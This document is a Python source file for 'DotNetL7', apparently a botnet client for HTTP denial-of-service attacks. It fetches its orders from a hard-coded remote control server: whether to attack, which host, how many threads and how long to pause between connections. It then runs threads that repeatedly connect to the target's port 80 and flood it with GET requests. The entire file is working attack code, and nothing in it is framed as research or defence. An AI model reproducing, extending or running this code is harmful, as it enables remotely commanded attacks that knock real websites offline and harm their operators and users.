"""
Author: @r_RiX_x
Name: DotNetL7
Version: 1.0
"""

#import libs
import sys
import socket
import requests
import threading
from time import sleep as delay
from os import name as system_name
from os import system as system_write
#from random import choice as random_choice
from random import randint as random_integer
from configparser import ConfigParser

#main function that starts all
def main():
    global ATTACKING_STATUS, THREADS_COUNT, DELAY_BETWEEN_CONNECTIONS, RUNNING_THREADS

    #clear terminal
    system_write("cls" if system_name == "nt" else "clear")

    #print welcome text
    welcome_text = """
  ___        _    _  _       _    _                          ____ 
 |   \  ___ | |_ | \| | ___ | |_ | |    __ _  _  _  ___  _ _|__  |
 | |) |/ _ \|  _|| .` |/ -_)|  _|| |__ / _` || || |/ -_)| '_| / / 
 |___/ \___/ \__||_|\_|\___| \__||____|\__,_| \_, |\___||_|  /_/  
 Author: @r_RiX_x                             |__/    Version: 1.0
    """
    print(welcome_text)

    #define thread variable to not catch error when it's none
    RUNNING_THREADS = 0

    #catch errors
    try:

        #update configuration
        while True:

            #start get_options function and print results
            get_options()
            print("Configuration successfully updated and applied")

            #check for starting
            if ATTACKING_STATUS == True and TARGET != None:

                #check for re-creating threads when needs less
                if THREADS_COUNT < RUNNING_THREADS:
                    #stop threads
                    ATTACKING_STATUS = False
                    delay(30)
                    ATTACKING_STATUS = True

                #create and start threads
                create_threads()

            #print threads results
            print("Threads: {}/{}".format(RUNNING_THREADS, THREADS_COUNT))

            #delay updating config to except too many incoming requests on control server
            delay(random_integer(15, 30))

    #catch, print error and exit
    except Exception as error:
        ATTACKING_STATUS = False
        exit("Error: " + str(error))

    #catch, print ctrl+c and exit
    except KeyboardInterrupt:
        ATTACKING_STATUS = False
        exit("Ctrl+C")

#create threads function
def create_threads():
    global THREADS_COUNT, DELAY_BETWEEN_CONNECTIONS, RUNNING_THREADS

    #start threads
    for thread in range(THREADS_COUNT-RUNNING_THREADS):
        thread_object = threading.Thread(target=dos)
        thread_object.start()

        #add 1 to running threads variable
        RUNNING_THREADS += 1

        #make delay between each thread started
        delay(DELAY_BETWEEN_CONNECTIONS)

#get options from control server
def get_options():
    global ATTACKING_STATUS, TARGET, THREADS_COUNT, DELAY_BETWEEN_CONNECTIONS

    #define control server
    control_server = "http://www.c0ntr0lp4n3l.eu5.net/CONFIG.x"

    #get configurations
    try:
        config_request = requests.get(control_server, allow_redirects=False, timeout=30)
        configurations = config_request.content.decode("utf-8")
    #pass when timed out
    except:
        pass

    #define and read configuration file
    config = ConfigParser()
    config.read_string(configurations)

    #define configurations
    ATTACKING_STATUS = config["Configuration"]["ATTACKING_STATUS"].replace("\"", "")
    #check for statement and set to bool type
    if ATTACKING_STATUS.lower() == "true":
        ATTACKING_STATUS = True
    else:
        ATTACKING_STATUS = False
    #pass if target is none
    try:
        TARGET = socket.gethostbyname(str(config["Configuration"]["TARGET_RESOLVER"]).replace("\"", ""))
    except:
        TARGET = None
    THREADS_COUNT = int(config["Configuration"]["THREADS_COUNT"].replace("\"", ""))
    DELAY_BETWEEN_CONNECTIONS = int(config["Configuration"]["DELAY_BETWEEN_CONNECTIONS"].replace("\"", ""))/1000

#create socket function
def create_socket():

    #define sock variable
    sock = socket.socket(
        socket.AF_INET,
        socket.SOCK_STREAM,
        socket.IPPROTO_TCP
    )

    #set socket connection timeout to 30 seconds
    sock.settimeout(30)

    #return created socket
    return sock

#dos target function
def dos():
    global ATTACKING_STATUS, TARGET, DELAY_BETWEEN_CONNECTIONS, RUNNING_THREADS

    #do while status is active
    while ATTACKING_STATUS:

        #catch error        
        try:

            #catch errors
            try:
                sock = create_socket()
                sock.connect((TARGET, 80))
                while ATTACKING_STATUS:

                    #catch errors
                    try:

                        #send empty http request and print results
                        sock.send("GET / HTTP/1.1\r\n\r\n".encode("utf-8"))

                    #catch reseted connection error
                    except:

                        #close socket, make delay and break cycle to create new
                        sock.close()
                        delay(DELAY_BETWEEN_CONNECTIONS)
                        break

            #catch timeouted connection error
            except:

                #close socket and start again cycle to create new
                sock.close()
                continue

        #catch some error with closing socket what's none
        except:

            #pass the error
            continue

    #substract 1 from running threads count and exit thread
    RUNNING_THREADS -= 1
    sys.exit(0)

if __name__ == "__main__":
    #start main functions if script running as main
    main()